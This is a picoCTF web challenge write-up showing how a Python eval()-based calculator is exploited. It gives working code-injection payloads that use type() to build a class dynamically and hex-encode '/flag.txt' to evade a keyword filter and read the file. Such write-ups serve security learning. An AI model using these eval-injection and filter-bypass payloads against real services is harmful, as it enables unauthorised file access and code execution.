# 3v@l

**Platform:**  picoCTF
**Category:** Web  
**Difficulty:**  Medium

---

## Description

The challenge provides a simple **web-based calculator** that evaluates user input using Python’s `eval()` function. The goal is to exploit this functionality to retrieve the flag from the server.

The interface contains:

- An **expression input field**
    
- An **Execute button**
    
- A **Go Back button** (not relevant)
    

Since the application evaluates user input directly, it suggests the presence of a **code injection vulnerability**.

- **Files:** None
    
- **URL:** Challenge web page
    
- **IP:** -

## Initial Recon / Enumeration

The web page allows a single expression to be submitted and evaluated by the backend.

### Commands / Tools

- Web browser
    

### Notes

Initial testing shows that the backend evaluates expressions using Python `eval()`.

Testing a simple expression:

```
print(1)
```

Result:

```
Result: None
```

Explanation:

- `print(1)` outputs `1` to stdout.
    
- However, the function itself returns `None`.
    
- The application displays the **return value** of the evaluated expression.
    

This means that if an expression returns a value, it will be displayed on the page.

Further testing shows:

- Some characters are filtered using regex.
    
- Certain keywords are blocked.
    
- Strings like `.txt` are forbidden.
    

---

## Analysis

The application evaluates user input using Python `eval()` and then prints the return value of the expression.

Direct attempts to access files fail because:

- Certain keywords are filtered
    
- `.txt` is specifically blocked
    

However, Python allows **dynamic class creation** using the `type()` function. This can be used to create a class with a method that executes arbitrary code.

Example dynamic class:

```python
type('dynamicClass', (object,), {'method':lambda self:1})().method()
```

This creates a class with a method that returns `1`.  
When executed, the application responds with:

```
Result: 1
```

This confirms that arbitrary Python code can be executed.

The next step is to modify the method so it reads the contents of `/flag.txt`.

---

## Exploitation / Solution

### 1. Create a dynamic class

Use Python’s `type()` to define a class dynamically and call its method.

```python
type('dynamicClass', (object,), {'method':lambda self:1})().method()
```

This confirms code execution is possible.

---

### 2. Attempt to read `/flag.txt`

Modify the method to open the flag file.

```python
type('dynamicClass', (object,), {'method':lambda self:open('/flag.txt').read()})().method()
```

This fails because `.txt` is filtered.

---

### 3. Bypass the filter using hex encoding

Original path:

```
/flag.txt
```

Hex encoded:

```
2f666c61672e747874
```

Decode it in Python:

```python
bytes.fromhex('2f666c61672e747874').decode('utf-8')
```

This reconstructs the string `/flag.txt` without directly writing `.txt` in the payload.

---

### 4. Final payload

```
type('dynamicClass', (object,), {'method':lambda self:open((bytes.fromhex('2f666c61672e747874').decode('utf-8'))).read()})().method()
```

`another code that also works`

```python
open(bytes.fromhex('2f666c61672e747874').decode()).read()
```

What this payload does:

1. Decodes the hex string into `/flag.txt`
    
2. Opens the file
    
3. Reads the file content
    
4. Returns it as the result of the evaluated expression
    

The application then prints the file contents.

## Key Idea

Even with keyword filtering, Python’s dynamic features such as `type()` allow arbitrary code execution. Encoding restricted strings allows bypassing input filters and accessing sensitive files.
